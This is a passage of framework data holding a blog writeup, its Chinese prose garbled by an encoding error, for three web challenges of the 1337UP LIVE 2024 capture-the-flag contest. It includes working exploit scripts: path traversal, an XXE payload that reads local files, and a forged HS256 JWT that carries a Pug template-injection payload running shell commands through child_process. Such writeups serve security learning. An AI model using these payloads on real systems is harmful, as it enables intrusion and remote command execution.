2:I[55329,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-29ee5e4b02f3cf98.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-29b9c18639a2a38e.js"],""]
3:I[76842,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-29ee5e4b02f3cf98.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-29b9c18639a2a38e.js"],"PostMeta"]
4:"$Sreact.suspense"
6:I[76842,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-29ee5e4b02f3cf98.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-29b9c18639a2a38e.js"],"LikeButton"]
7:I[5613,[],""]
9:I[31778,[],""]
a:I[89806,["250","static/chunks/250-0ef8476c0fa8ee24.js","372","static/chunks/372-15c56d21d8e8e229.js","993","static/chunks/app/(posts)/layout-6e6c57aef3ee92cf.js"],""]
b:I[25694,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-71de1b4a5090c7d9.js"],"GlobalProvider"]
c:I[30397,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-71de1b4a5090c7d9.js"],""]
8:["slug","24d/wp-1337uplive-2024","c"]
0:["nyIOWxxv2Hb1zcxcPyrwk",[[["",{"children":["(posts)",{"children":[["slug","24d/wp-1337uplive-2024","c"],{"children":["__PAGE__?{\"slug\":[\"24d\",\"wp-1337uplive-2024\"]}",{}]}]}]},"$undefined","$undefined",true],["",{"children":["(posts)",{"children":[["slug","24d/wp-1337uplive-2024","c"],{"children":["__PAGE__",{},["$L1",[["$","$L2",null,{}],false,["$","h1",null,{"className":"x-post-title","children":"1337UP LIVE CTF 2024 Writeup"}],["$","$L3",null,{"path":"/24d/wp-1337uplive-2024/"}],["$","$4",null,{"fallback":["$","p",null,{"children":"Loading component..."}],"children":"$L5"}],["$","$L6",null,{"path":"/24d/wp-1337uplive-2024/"}]],null]]},["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","(posts)","children","$8","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/717a90e5599f6ea4.css","precedence":"next","crossOrigin":""}]]}]]},[null,["$","div",null,{"id":"post-layout","children":[["$","div",null,{"id":"main","className":"center-wrapper","children":["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","(posts)","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":null}]}],["$","$La",null,{}]]}],null]]},[null,["$","html",null,{"lang":"zh-CN","suppressHydrationWarning":true,"children":[["$","head",null,{"children":[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon"}],["$","script",null,{"async":true,"src":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"}],["$","script",null,{"async":true,"src":"https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY"}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nwindow.dataLayer = window.dataLayer || [];\nfunction gtag() {\n    dataLayer.push(arguments);\n}\ngtag('js', new Date());\ngtag('config', 'G-45BYSZ6WPY');\n"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"const a=z=>h.getItem(z),b=(y,z)=>h.setItem(y,z),c=(y,z)=>document.documentElement.setAttribute(y,z),d='theme',e='dark',f='light',g='class',h=localStorage;a(d)!==e&&a(d)!==f&&b(d,f);a(d)===e?c(g,e):c(g,f);"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nif (!Array.prototype.findLast) {\n    Array.prototype.findLast = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return this[i];\n        }\n        return undefined;\n    };\n}\nif (!Array.prototype.findLastIndex) {\n    Array.prototype.findLastIndex = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return i;\n        }\n        return -1;\n    };\n}\n"}}]]}],["$","body",null,{"children":["$","$Lb",null,{"children":[["$","$Lc",null,{}],["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":["$","div",null,{"id":"notfound","children":[["$","img",null,{"alt":"img","src":"/images/cry.gif"}],["$","code",null,{"id":"notfound-404","children":"404"}],["$","code",null,{"id":"notfound-text","children":"Page Not Found"}]]}],"notFoundStyles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/98e601cf5ba3633d.css","precedence":"next","crossOrigin":""}]],"styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/95b9a222519ec85f.css","precedence":"next","crossOrigin":""}]]}]]}]}]]}],null]],[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/4682f1d53f08c69e.css","precedence":"next","crossOrigin":""}]],"$Ld"]]]]
e:I[74365,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-29ee5e4b02f3cf98.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-29b9c18639a2a38e.js"],""]
f:I[62029,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-29ee5e4b02f3cf98.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-29b9c18639a2a38e.js"],""]
10:T43e,<span class="token keyword">import</span> requests

<span class="token comment"># login with agent_1337, intel420</span>

path <span class="token operator">=</span> <span class="token string">"/assets/images/../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php"</span>
url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">"</span></span>
resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token comment"># $flag = 'INTIGRITI{70p_53cr37_m15510n_c0mpl373}';</span>
11:T601,<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"https://biocorp.ctf.intigriti.io/panel.php"</span>
xml <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
&lt;!DOCTYPE root [
&lt;!ENTITY fileContents SYSTEM "file:///../flag.txt">
]>
&lt;root>
&lt;temperature>&amp;fileContents;&lt;/temperature>
&lt;pressure>77&lt;/pressure>
&lt;control_rods>77&lt;/control_rods>
&lt;/root>
"""</span>
resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"X-BIOCORP-VPN"</span><span class="token punctuation">:</span> <span class="token string">"80.187.61.102"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/xml"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> data<span class="token operator">=</span>xml<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token comment"># Temperature: INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn} Â°C</span>
12:T1b15,<span class="token keyword">function</span> <span class="token function">signJWT</span><span class="token punctuation">(</span><span class="token parameter">payload</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
        jwt<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>privateKey<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token string">"RS256"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> token</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Error encoding token"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token function">resolve</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">verifyJWT</span><span class="token punctuation">(</span><span class="token parameter">token</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>token <span class="token operator">||</span> <span class="token keyword">typeof</span> token <span class="token operator">!==</span> <span class="token string">"string"</span> <span class="token operator">||</span> token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">!==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Invalid token format"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        jwt<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>publicKey<span class="token punctuation">,</span> token<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> header</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Invalid or expired token"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>header<span class="token punctuation">.</span>alg<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"none"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Algorithm 'none' is not allowed"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token function">resolve</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
13:T4f6,const fs = require("fs");
const jwt = require("json-web-token");
const jwkToPem = require("jwk-to-pem");

// const publicKey = fs.readFileSync("public_key.pem", "utf8");

const publicKey = jwkToPem({
    "kty": "RSA",
    "n": "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw",
    "e": "AQAB",
    "alg": "RS256",
    "use": "sig"
});

function signJWT(payload) {
    return new Promise((resolve, reject) => {
        jwt.encode(publicKey, payload, "HS256", (err, token) => {
            if (err) {
                return reject(new Error("Error encoding token"));
            }
            resolve(token);
        });
    });
}

signJWT({
    // username: "#{global.process.mainModule.constructor._load('child_process').execSync('ls /').toString()}"
    username: "#{global.process.mainModule.constructor._load('child_process').execSync('cat /flag_Gx4wVbEc1fxN9ztM.txt').toString()}"
}).then(token => {
    console.log(token);
    fs.writeFileSync("token.txt", token);
});
14:T18ee,<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"json-web-token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> jwkToPem <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"jwk-to-pem"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// const publicKey = fs.readFileSync("public_key.pem", "utf8");</span>

<span class="token keyword">const</span> publicKey <span class="token operator">=</span> <span class="token function">jwkToPem</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    <span class="token string-property property">"kty"</span><span class="token operator">:</span> <span class="token string">"RSA"</span><span class="token punctuation">,</span>
    <span class="token string-property property">"n"</span><span class="token operator">:</span> <span class="token string">"w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw"</span><span class="token punctuation">,</span>
    <span class="token string-property property">"e"</span><span class="token operator">:</span> <span class="token string">"AQAB"</span><span class="token punctuation">,</span>
    <span class="token string-property property">"alg"</span><span class="token operator">:</span> <span class="token string">"RS256"</span><span class="token punctuation">,</span>
    <span class="token string-property property">"use"</span><span class="token operator">:</span> <span class="token string">"sig"</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">signJWT</span><span class="token punctuation">(</span><span class="token parameter">payload</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
        jwt<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>publicKey<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> token</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Error encoding token"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token function">resolve</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">signJWT</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    <span class="token comment">// username: "#{global.process.mainModule.constructor._load('child_process').execSync('ls /').toString()}"</span>
    <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">"#{global.process.mainModule.constructor._load('child_process').execSync('cat /flag_Gx4wVbEc1fxN9ztM.txt').toString()}"</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">token</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>
    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">"token.txt"</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
15:T799,<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://catclub-2.ctf.intigriti.io/cats"</span></span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"catclub_exp/token.txt"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    token <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"token"</span><span class="token punctuation">:</span> token<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment"># print(resp.text)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'alt="Club Logo">&lt;/nav>&lt;/header>&lt;div class="content">&lt;h1>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># Welcome to the Cat Gallery, INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}!&lt;/h1> ...</span>
5:[["$","h2",null,{"className":"x-h1","children":"Web"}],["$","h3",null,{"className":"x-h2","children":"Pizza Paradise"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"å¨<code class=\"x-inline-highlight\">robots.txt</code>ä¸­æ¾å°ç»å½é¡µé¢<code class=\"x-inline-highlight\">/secret_172346606e1d24062e891d537e917a90.html</code>ï¼å¨JSä¸­æ¾å°ç¨æ·ååå¯ç çåå¸å¼ï¼éåæ¾å°ä¸ä¸ªæ¥å¼±å£ä»¤çç½ç«<a href=\"https://crackstation.net\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://crackstation.net</a>ï¼æ¥å°å¯ç æ¯<code class=\"x-inline-highlight\">intel420</code>ï¼ç»å½ã"}}],["$","$Le",null,{"src":"fig1.jpg","width":"100%"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"ç»å½åæ¯ä¸è½½å¾ççé¡µé¢ï¼æè·¯å¾éåæ¼æ´ã<code class=\"x-inline-highlight\">flag</code>å¨é¡µé¢çPHPæºç ä¸­ã"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Lf",null,{"className":"x-codeblock-header-copy","text":"import requests\n\n# login with agent_1337, intel420\n\npath = \"/assets/images/../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php\"\nurl = f\"https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download={path}\"\nresp = requests.get(url)\nprint(resp.text)\n\n# $flag = 'INTIGRITI{70p_53cr37_m15510n_c0mpl373}';\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$10"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"BioCrop"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"ç»äºæºç ï¼éè¦ç»è¿å¯¹IPçæ£æµï¼æå¡ç«¯ç¨äºèªå®ä¹çHTTPå¤´ï¼ï¼ç¶åæ¯XXEï¼XMLå¤é¨å®ä½æ³¨å¥ï¼ã"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Lf",null,{"className":"x-codeblock-header-copy","text":"import requests\n\nurl = \"https://biocorp.ctf.intigriti.io/panel.php\"\nxml = \"\"\"\n<!DOCTYPE root [\n<!ENTITY fileContents SYSTEM \"file:///../flag.txt\">\n]>\n<root>\n<temperature>&fileContents;</temperature>\n<pressure>77</pressure>\n<control_rods>77</control_rods>\n</root>\n\"\"\"\nresp = requests.post(url, headers={\"X-BIOCORP-VPN\": \"80.187.61.102\", \"Content-Type\": \"application/xml\"}, data=xml)\nprint(resp.text)\n\n# Temperature: INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn} Â°C\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$11"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"Cat Club"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"JWTç®æ³æ··æ·+Pugæ¨¡æ¿å¼æçSSTIã"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"æ³¨åç»å½å<code class=\"x-inline-highlight\">/cats</code>é¡µé¢ä¼æ¾ç¤ºç¨æ·çç¨æ·åï¼å®¡è®¡ååç°å­å¨SSTIï¼"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"JavaScript"}],["$","$Lf",null,{"className":"x-codeblock-header-copy","text":"if (typeof req.user != \"undefined\") {\n    template = template.replace(/guest/g, req.user);\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> req<span class=\"token punctuation\">.</span>user <span class=\"token operator\">!=</span> <span class=\"token string\">\"undefined\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    template <span class=\"token operator\">=</span> template<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">guest</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> req<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"ä½æ¯å¸¸è§ææ®µæ³¨åä¸åè®¸åºç°éæ°å­åå­æ¯çå­ç¬¦ï¼èèç´æ¥æé ç¨æ·åä¸ºpayloadçJWT<code class=\"x-inline-highlight\">token</code>ã"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">/jwks.json</code>æ¥å£æ³é²äº<code class=\"x-inline-highlight\">publicKey</code>ï¼å¹¶ä¸æå¡ç«¯æ£éªJWTçå½æ°æ¯ï¼"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"JavaScript"}],["$","$Lf",null,{"className":"x-codeblock-header-copy","text":"function signJWT(payload) {\n    return new Promise((resolve, reject) => {\n        jwt.encode(privateKey, payload, \"RS256\", (err, token) => {\n            if (err) {\n                return reject(new Error(\"Error encoding token\"));\n            }\n            resolve(token);\n        });\n    });\n}\n\nfunction verifyJWT(token) {\n    return new Promise((resolve, reject) => {\n        if (!token || typeof token !== \"string\" || token.split(\".\").length !== 3) {\n            return reject(new Error(\"Invalid token format\"));\n        }\n\n        jwt.decode(publicKey, token, (err, payload, header) => {\n            if (err) {\n                return reject(new Error(\"Invalid or expired token\"));\n            }\n\n            if (header.alg.toLowerCase() === \"none\") {\n                return reject(new Error(\"Algorithm 'none' is not allowed\"));\n            }\n\n            resolve(payload);\n        });\n    });\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$12"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"RSAçç§é¥æ æ³æ¿å°ï¼ä½ä¸è¿°æ ¡éªå­å¨ç®æ³æ··æ·æ¼æ´ï¼å¯ä»¥èªå·±ç¨<code class=\"x-inline-highlight\">publicKey</code>åHS256ç®æ³åä¸ä¸ªç­¾åï¼æ­¤æ¶æå¡ç«¯æ ¡éªçé»è¾ä»ç¶æ¯ä½¿ç¨<code class=\"x-inline-highlight\">publicKey</code>éªè¯ï¼èç®æ³å·²ç»è¢«æå®ä¸ºHS256ï¼äºæ¯å¯ä»¥éè¿ãçæ<code class=\"x-inline-highlight\">token</code>çä»£ç æ¯ï¼"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"JavaScript"}],["$","$Lf",null,{"className":"x-codeblock-header-copy","text":"$13"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 408px, var(--bg-transparent-golden) 408px 432px, transparent 432px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$14"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"æ»å»ï¼"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Lf",null,{"className":"x-codeblock-header-copy","text":"import requests\n\nurl = f\"https://catclub-2.ctf.intigriti.io/cats\"\n\nwith open(\"catclub_exp/token.txt\") as f:\n    token = f.read().strip()\nresp = requests.get(url, cookies={\"token\": token})\n\n# print(resp.text)\nprint(resp.text.split('alt=\"Club Logo\"></nav></header><div class=\"content\"><h1>')[1])\n\n# Welcome to the Cat Gallery, INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}!</h1> ...\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$15"}}]}]]}]]
d:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}],["$","title","2",{"children":"1337UP LIVE CTF 2024 Writeup - éæ¨çç½ç»æ¥è®°"}],["$","link","3",{"rel":"canonical","href":"https://1kuzus.github.io/24d/wp-1337uplive-2024/"}]]
1:null
